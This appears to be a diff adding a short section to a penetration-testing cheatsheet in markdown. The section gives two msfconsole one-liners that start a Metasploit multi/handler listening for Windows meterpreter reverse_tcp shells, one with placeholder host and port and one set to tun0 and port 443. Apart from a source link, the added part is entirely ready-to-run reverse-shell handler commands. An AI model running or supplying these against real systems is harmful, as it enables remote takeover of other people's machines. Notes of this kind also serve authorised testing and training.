@@ -16,9 +16,13 @@ sessions
 ```
 
 ```
-### 
-```
 
+### One liner start meterpreter
+https://github.com/andrewjkerr/security-cheatsheets/blob/master/metasploit
+```
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
+
+msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0; set LPORT 443;run;"
 ```
 ### 
 ```
